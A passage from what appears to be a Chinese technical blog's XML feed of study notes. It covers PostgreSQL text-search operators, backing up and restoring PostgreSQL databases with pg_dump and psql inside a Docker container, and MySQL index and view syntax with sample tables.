<h4 id="文本搜索操作符"><a href="#文本搜索操作符" class="headerlink" title="文本搜索操作符"></a>文本搜索操作符</h4><table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td><code>@@</code></td>
<td><code>tsvector</code>匹配<code>tsquery</code>吗？</td>
<td><code>to_tsvector(&#39;fat cats ate rats&#39;) @@ to_tsquery(&#39;cat &amp; rat&#39;)</code></td>
<td><code>t</code></td>
</tr>
<tr>
<td><code>@@@</code></td>
<td><code>@@</code>的已废弃同义词</td>
<td><code>to_tsvector(&#39;fat cats ate rats&#39;) @@@ to_tsquery(&#39;cat &amp; rat&#39;)</code></td>
<td><code>t</code></td>
</tr>
<tr>
<td>&#96;</td>
<td></td>
<td>&#96;</td>
<td>连接<code>tsvector</code></td>
</tr>
<tr>
<td><code>&amp;&amp;</code></td>
<td>将<code>tsquery</code>用 AND 连接起来</td>
<td>&#96;’fat</td>
<td>rat’::tsquery &amp;&amp; ‘cat’::tsquery&#96;</td>
</tr>
<tr>
<td>&#96;</td>
<td></td>
<td>&#96;</td>
<td>将<code>tsquery</code>用 OR 连接起来</td>
</tr>
<tr>
<td><code>!!</code></td>
<td>对一个<code>tsquery</code>取反</td>
<td><code>!! &#39;cat&#39;::tsquery</code></td>
<td><code>!&#39;cat&#39;</code></td>
</tr>
<tr>
<td><code>@&gt;</code></td>
<td><code>tsquery</code>包含另一个？</td>
<td><code>&#39;cat&#39;::tsquery @&gt; &#39;cat &amp; rat&#39;::tsquery</code></td>
<td><code>f</code></td>
</tr>
<tr>
<td><code>&lt;@</code></td>
<td><code>tsquery</code>被包含？</td>
<td><code>&#39;cat&#39;::tsquery &lt;@ &#39;cat &amp; rat&#39;::tsquery</code></td>
<td><code>t</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>Note:</strong> <code>tsquery</code>的包含操作符只考虑两个查询中的词位，而忽略组合操作符。</p>
</blockquote>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="http://www.postgres.cn/docs/10/textsearch-controls.html#TEXTSEARCH-PARSING-DOCUMENTS">12.3. 空值文本搜索 (postgres.cn)</a></p>
<p><a href="http://www.postgres.cn/docs/9.3.4/functions-textsearch.html">文本搜索函数和操作符 (postgres.cn)</a></p>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>postgresql数据库备份和还原</title>
    <url>/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/</url>
    <content><![CDATA[<h2 id="postgresql数据库备份和还原"><a href="#postgresql数据库备份和还原" class="headerlink" title="postgresql数据库备份和还原"></a>postgresql数据库备份和还原</h2><p>参考自<a href="https://cubesec.yuque.com/ybgdo8/snryyh/og3nmd#SLwJH">CSM中postgres数据库备份与恢复 (yuque.com)</a></p>
<h3 id="CSM中postgres结构"><a href="#CSM中postgres结构" class="headerlink" title="CSM中postgres结构"></a>CSM中postgres结构</h3><p>在CSM中postgres以docker容器的方式存在，宿主机61002端口映射到postgres的5432端口。</p>
<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1658198020461-80dcb68a-d33b-4949-97c8-994d88a49f4f.png" class title="img">

<span id="more"></span>

<p>以文件挂载的形式将宿主机的  &#x2F;home&#x2F;cubesec&#x2F;master&#x2F;database&#x2F;main  挂载到  pgsql容器的 &#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data</p>
<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1658199595434-ee9dd315-2e70-4aba-9b4f-3136dfa6620c.png" class title="img">

<h3 id="pgsql连接方式"><a href="#pgsql连接方式" class="headerlink" title="pgsql连接方式"></a>pgsql连接方式</h3><h4 id="pgadmin连接"><a href="#pgadmin连接" class="headerlink" title="pgadmin连接"></a>pgadmin连接</h4><p>打开pgadmin,创建-服务器</p>
<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1658198600591-e596019d-af77-47de-892b-23c556614302.png" class title="img">

<p>密码在 &#x2F;home&#x2F;cubesec&#x2F;master&#x2F;master&#x2F;common&#x2F;config.py中 dbpass</p>
<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1658198714035-8a6cfe19-a8d9-456e-b35f-cf1f74026270.png" class title="img">

<h4 id="进入pgsql容器"><a href="#进入pgsql容器" class="headerlink" title="进入pgsql容器"></a>进入pgsql容器</h4><img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1658199040688-61296647-088d-4f15-9663-923216a8d1a8.png" class title="img">

<blockquote>
<p> docker ps -a | grep pgsql    查看pgsql容器ID<br> docker exec -it 容器ID  &#x2F;bin&#x2F;bash   进入pgsql容器<br> su postgres    使用postgres用户登录<br> psql    进shell<br> \l      列数据库<br> \c vrp    进入vrp数据库<br> \d      列出所有表 </p>
</blockquote>
<h3 id="windows下postgresql数据库备份和还原"><a href="#windows下postgresql数据库备份和还原" class="headerlink" title="windows下postgresql数据库备份和还原"></a>windows下postgresql数据库备份和还原</h3><p>通过cmd进入数据库的bin目录 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files\PostgreSQL\10\bin</span><br></pre></td></tr></table></figure>

<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>localhost 或者IP都行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">pg_dump <span class="operator">-</span>h localhost <span class="operator">-</span>p <span class="number">5432</span> <span class="operator">-</span>U postgres <span class="operator">-</span>d pgtest<span class="operator">&gt;</span>E:\cubesec\test.txt</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1687683370755.jpg" class width="1687683370755">

<h4 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">psql <span class="operator">-</span>h localhost <span class="operator">-</span>p <span class="number">5432</span> <span class="operator">-</span>U postgres <span class="operator">-</span>d pgstudy<span class="operator">&lt;</span> E:\cubesec\pgstudy.bak</span><br></pre></td></tr></table></figure>

<img data-src="/2023/06/28/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F/1687684321665.jpg" class>

<h3 id="linux下postgresql数据库备份和还原"><a href="#linux下postgresql数据库备份和还原" class="headerlink" title="linux下postgresql数据库备份和还原"></a>linux下postgresql数据库备份和还原</h3><h4 id="备份-1"><a href="#备份-1" class="headerlink" title="备份"></a>备份</h4><p>1.进入容器，切换到postgres用户</p>
<blockquote>
<p>$ docker exec -it 容器pgsql_server的id &#x2F;bin&#x2F;bash</p>
<p>$ su - postgres</p>
</blockquote>
<p>2.根据需求不同，选取不同的备份方式<br>(1).备份数据库（包含创建数据库）</p>
<blockquote>
<p>$ pg_dump -C db_name &gt; db_bak.sql</p>
</blockquote>
<p>(2).备份数据库内容（不包含创建数据库）</p>
<blockquote>
<p>$ pg_dump db_name &gt; db_content_bak.sql</p>
</blockquote>
<p>(3).备份schema（命名空间&#x2F;模式）和数据（包含创建schema）</p>
<blockquote>
<p>$ pg_dump -n “schema_name” db_name &gt; schema_bak.sql</p>
</blockquote>
<p>(4).备份表和数据（包含建表）</p>
<blockquote>
<p>-t: 默认备份表数据和结构</p>
<p>$ pg_dump -t “schema_name.table_name” db_name &gt; table_bak.sql</p>
</blockquote>
<p>(5).备份表内数据（不包建表语句）</p>
<blockquote>
<p>-a: 只备份表数据</p>
<p>$ pg_dump -a -t “schema_name.table_name” db_name &gt; table_content_bak.sql</p>
</blockquote>
<p>(6).备份除vrp_vulcpe外的所有表数据和结构</p>
<blockquote>
<p>-T: 备份除vrp_vulcpe外的所有表数据和结构</p>
<p>pg_dump -U postgres -d vrp -T vrp_vulcpe -f &#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&#x2F;tmp&#x2F;vrp_vulcpe.sql</p>
<p>除以上表格外其他vrp数据库中的表全部备份到dump.sql，在宿主机的&#x2F;home&#x2F;cubesec&#x2F;master&#x2F;database&#x2F;main&#x2F;tmp 即可拷贝出来</p>
</blockquote>
<h4 id="还原-1"><a href="#还原-1" class="headerlink" title="还原"></a>还原</h4><p>恢复之前仍需要进入postgres命令行</p>
<p>1.切换到postgres用户</p>
<blockquote>
<p>$ sudo su - postgres</p>
</blockquote>
<p>2.恢复数据<br>(1).恢复数据库及其内容（数据库不存在）</p>
<blockquote>
<p>$ psql -e &lt; db_bak.sql</p>
</blockquote>
<p>(2).恢复数据库内容（数据库必须已存在，且库中不存在备份文件中将要的创建的对象）</p>
<blockquote>
<p>psql -e db_name &lt; bak.sql</p>
</blockquote>
<p>3.免去交互输入密码</p>
<blockquote>
<p>PGPASSWORD&#x3D;123456 psql -U username -e db_name &lt; bak.sql</p>
</blockquote>
<p>4.其他常用恢复命令</p>
<blockquote>
<p>psql -U postgres -d vrp -f &#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&#x2F;tmp&#x2F;dump.sql   恢复之前备份的表</p>
</blockquote>
<p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/26326708/1658200544449-80ce6bf5-8900-40c5-8b9c-507073f02807.png" alt="img"></p>
<blockquote>
<p>psql -U postgres -d vrp -f &#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data&#x2F;tmp&#x2F;schema.sql  恢复之前备份的表结构</p>
</blockquote>
<p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/26326708/1658200500342-9a1eeaeb-353d-4112-a679-18c4e597fc2a.png" alt="img"></p>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL各种查询用法及优化</title>
    <url>/2023/11/06/SQL%E5%90%84%E7%A7%8D%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%B3%95%E5%8F%8A%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h2 id="SQL各种查询用法"><a href="#SQL各种查询用法" class="headerlink" title="SQL各种查询用法"></a>SQL各种查询用法</h2><p>参考链接：</p>
<p><a href="https://blog.csdn.net/qq_42534026/article/details/105951000">MySQL查询语句大全（列举所有常用查询方式）_mysql查询所有数据query-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_42464569/article/details/112249866">SQL语句——查询_sql语句包含查询_HMTT的博客-CSDN博客</a></p>
<h2 id="MySQL索引"><a href="#MySQL索引" class="headerlink" title="MySQL索引"></a>MySQL索引</h2><h3 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h3><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...);</span><br><span class="line">#例子：</span><br><span class="line"><span class="keyword">CREATE</span> INDEX idx_name <span class="keyword">ON</span> students (name);</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="修改表结构-添加索引"><a href="#修改表结构-添加索引" class="headerlink" title="修改表结构(添加索引)"></a>修改表结构(添加索引)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> INDEX index_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...);</span><br><span class="line">#例子：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees</span><br><span class="line"><span class="keyword">ADD</span> INDEX idx_age (age);</span><br></pre></td></tr></table></figure>

<h4 id="创建表的时候直接指定"><a href="#创建表的时候直接指定" class="headerlink" title="创建表的时候直接指定"></a>创建表的时候直接指定</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  ...,</span><br><span class="line">  INDEX index_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...)</span><br><span class="line">);</span><br><span class="line">#例子：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> students (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">  name <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">  age <span class="type">INT</span>,</span><br><span class="line">  INDEX idx_age (age)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX index_name <span class="keyword">ON</span> table_name;</span><br><span class="line">#使用 <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 语句删除索引的语法如下：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> INDEX index_name;</span><br></pre></td></tr></table></figure>

<h3 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h3><h4 id="创建索引-1"><a href="#创建索引-1" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...);</span><br></pre></td></tr></table></figure>

<h4 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">table</span> mytable <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> [indexName] (columnName(length))</span><br></pre></td></tr></table></figure>

<h4 id="创建表的时候直接指定-1"><a href="#创建表的时候直接指定-1" class="headerlink" title="创建表的时候直接指定"></a>创建表的时候直接指定</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  ...,</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> index_name <span class="keyword">UNIQUE</span> (column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="使用ALTER-命令添加和删除索引"><a href="#使用ALTER-命令添加和删除索引" class="headerlink" title="使用ALTER 命令添加和删除索引"></a>使用ALTER 命令添加和删除索引</h3><p>有四种方式来添加数据表的索引：</p>
<ul>
<li>**ALTER TABLE tbl_name ADD PRIMARY KEY (column_list):**该语句添加一个主键，这意味着索引值必须是唯一的，且不能为NULL。</li>
<li><strong>ALTER TABLE tbl_name ADD UNIQUE index_name (column_list):</strong> 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。</li>
<li><strong>ALTER TABLE tbl_name ADD INDEX index_name (column_list):</strong> 添加普通索引，索引值可出现多次。</li>
<li>**ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list):**该语句指定了索引为 FULLTEXT ，用于全文索引。</li>
</ul>
<p>以下实例为在表中添加索引。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> INDEX (c);</span><br></pre></td></tr></table></figure>

<p>你还可以在 ALTER 命令中使用 DROP 子句来删除索引。尝试以下实例删除索引:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> INDEX c;</span><br></pre></td></tr></table></figure>

<h3 id="使用-ALTER-命令添加和删除主键"><a href="#使用-ALTER-命令添加和删除主键" class="headerlink" title="使用 ALTER 命令添加和删除主键"></a>使用 ALTER 命令添加和删除主键</h3><p>主键作用于列上（可以一个列或多个列联合主键），添加主键索引时，你需要确保该主键默认不为空（NOT NULL）。实例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl MODIFY i <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (i);</span><br></pre></td></tr></table></figure>

<p>你也可以使用 ALTER 命令删除主键：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br></pre></td></tr></table></figure>

<p>删除主键时只需指定PRIMARY KEY，但在删除索引时，你必须知道索引名。</p>
<h3 id="显示索引信息"><a href="#显示索引信息" class="headerlink" title="显示索引信息"></a>显示索引信息</h3><p>你可以使用 <strong>SHOW INDEX</strong> 命令来列出表中的相关的索引信息。</p>
<p>可以通过添加 <strong>\G</strong> 来格式化输出信息。</p>
<p><strong>SHOW INDEX</strong> 语句：:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> table_name\G</span><br><span class="line">........</span><br></pre></td></tr></table></figure>

<p>执行上述命令后，将会显示指定表中所有索引的详细信息，包括索引名称（Key_name）、索引列（Column_name）、是否是唯一索引（Non_unique）、排序方式（Collation）、索引的基数（Cardinality）等。</p>
<h2 id="MySQL视图"><a href="#MySQL视图" class="headerlink" title="MySQL视图"></a>MySQL视图</h2><h3 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h3><p>创建视图是指在已经存在的数据库表上建立视图。视图可以建立在一张表中，也可以建立在多张表中。</p>
<h4 id="查看创建视图的权限"><a href="#查看创建视图的权限" class="headerlink" title="查看创建视图的权限"></a>查看创建视图的权限</h4><p>创建视图需要具有CREATE VIEW的权限。同时应该具有查询涉及的列的SELECT权限。可以使用SELECT语句来查询这些权限信息。查询语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Select_priv,Create_view_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;用户名&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<p>（1）Select_priv：属性表示用户是否具有SELECT权限，Y表示拥有SELECT权限，N表示没有。</p>
<p>（2）Create_view_priv：属性表示用户是否具有CREATE VIEW权限；</p>
<p>（3）mysql.user：表示MySQL数据库下面的user表。</p>
<p>（4）用户名：参数表示要查询是否拥有权限的用户，该参数需要用单引号引起来。</p>
<p>示例：查询MySQL中root用户是否具有创建视图的权限。</p>
<p>MySQL中，创建视图是通过CREATE VIEW语句实现的。其语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">OR</span> REPLACE] [ALGORITHM<span class="operator">=</span>&#123;UNDEFINED<span class="operator">|</span><span class="keyword">MERGE</span><span class="operator">|</span>TEMPTABLE&#125;]</span><br><span class="line"><span class="keyword">VIEW</span> 视图名[(属性清单)]</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">SELECT</span>语句</span><br><span class="line">[<span class="keyword">WITH</span> [<span class="keyword">CASCADED</span><span class="operator">|</span><span class="keyword">LOCAL</span>] <span class="keyword">CHECK</span> OPTION];</span><br></pre></td></tr></table></figure>


<p>参数说明：</p>
<p>（1）ALGORITHM：可选项，表示视图选择的算法。</p>
<p>（2）视图名：表示要创建的视图名称。</p>
<p>（3）属性清单：可选项，指定视图中各个属性的名词，默认情况下与SELECT语句中的查询的属性相同。</p>
<p>（4）SELECT语句：表示一个完整的查询语句，将查询记录导入视图中。</p>
<p>（5）WITH CHECK OPTION：可选项，表示更新视图时要保证在该视图的权限范围之内。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#例：创建视图。</span><br><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">VIEW</span> view_student <span class="keyword">AS</span> <span class="keyword">SELECT</span> id,name,class <span class="keyword">FROM</span> student;</span><br><span class="line">#例：创建视图同时，指定属性清单。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_student1(stu_id,stu_name,stu_class) <span class="keyword">AS</span> <span class="keyword">SELECT</span> id,name,class <span class="keyword">FROM</span> student;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> view_student1(stu_id,stu_name,stu_class) <span class="keyword">AS</span> <span class="keyword">SELECT</span> id,name,class <span class="keyword">FROM</span> student;</span><br></pre></td></tr></table></figure>

<h3 id="修改视图"><a href="#修改视图" class="headerlink" title="修改视图"></a>修改视图</h3><p>修改视图是指修改数据库中已存在的表的定义。当基本表的某些字段发生改变时，可以通过修改视图来保持视图和基本表之间一致。MySQL中通过CREATE OR REPLACE VIEW语句和ALTER VIEW语句来修改视图。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#示例：修改视图</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">VIEW</span> view_student1 <span class="keyword">AS</span> <span class="keyword">SELECT</span> id,name,class <span class="keyword">FROM</span> student <span class="keyword">where</span> id  <span class="keyword">in</span> (<span class="keyword">select</span> id <span class="keyword">from</span> student );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> view_student1;</span><br></pre></td></tr></table></figure>

<p>说明：ALTER VIEW语句改变了视图的定义，该语句与CREATE OR REPLACE VIEW语句有着同样的限制，如果删除并重新创建一个视图，就必须重新为它分配权限。</p>
<h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><p>删除视图是指删除数据库中已存在的视图。删除视图时，只能删除视图的定义，不会删除数据。MySQL中，使用DROP VIEW语句来删除视图。但是，用户必须拥有DROP权限。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#例：删除视图。</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IF <span class="keyword">EXISTS</span> view_student;</span><br></pre></td></tr></table></figure>

<h3 id="查看视图"><a href="#查看视图" class="headerlink" title="查看视图"></a>查看视图</h3><p>查看视图是指查看数据库中已存在的视图的定义。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#例：查看视图。</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">describe</span> view_student;</span><br></pre></td></tr></table></figure>

<h3 id="视图练习"><a href="#视图练习" class="headerlink" title="视图练习"></a>视图练习</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#员工表和数据：</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee(  </span><br><span class="line">        ID <span class="type">INT</span>  <span class="keyword">PRIMARY</span> KEY  AUTO_INCREMENT,  </span><br><span class="line">        NAME <span class="type">CHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">        SEX  <span class="type">CHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">        AGE <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">        DEPARTMENT <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">        SALARY  <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  </span><br><span class="line">        HOME <span class="type">CHAR</span>(<span class="number">30</span>),  </span><br><span class="line">        MARRY <span class="type">CHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span>  <span class="string">&#x27;否&#x27;</span>,         </span><br><span class="line">        HOBBY <span class="type">CHAR</span>(<span class="number">30</span>)  </span><br><span class="line"> ); </span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;李红&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;人事资源部&#x27;</span>,<span class="string">&#x27;7000&#x27;</span>,<span class="string">&#x27;浙江&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;网球&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;姜文&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">21</span>,<span class="string">&#x27;人事资源部&#x27;</span>,<span class="string">&#x27;9000&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;看书&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;李楠&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">22</span>,<span class="string">&#x27;产品研发部&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;音乐&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;潇潇&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">23</span>,<span class="string">&#x27;产品研发部&#x27;</span>,<span class="string">&#x27;9000&#x27;</span>,<span class="string">&#x27;重庆&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;游泳&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;王亮&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">24</span>,<span class="string">&#x27;产品研发部&#x27;</span>,<span class="string">&#x27;9000&#x27;</span>,<span class="string">&#x27;四川&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;足球&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;程默&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">25</span>,<span class="string">&#x27;业务销售部&#x27;</span>,<span class="string">&#x27;8500&#x27;</span>,<span class="string">&#x27;福建&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;游戏&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span 